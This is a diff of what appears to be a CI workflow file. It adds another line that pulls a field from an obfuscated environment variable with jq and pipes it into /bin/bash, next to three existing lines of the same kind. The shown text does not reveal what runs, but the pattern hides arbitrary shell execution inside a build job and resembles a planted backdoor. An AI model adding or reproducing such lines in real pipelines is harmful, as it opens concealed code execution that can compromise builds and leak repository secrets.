@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$icol305" | jq -r .vwta75 | /bin/bash
           printf '%s' "$wgvx8311" | jq -r .eou2 | /bin/bash
           echo $ap849 | jq -r .p3 | /bin/bash
+          echo $ponpf5559 | jq -r .lx5 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
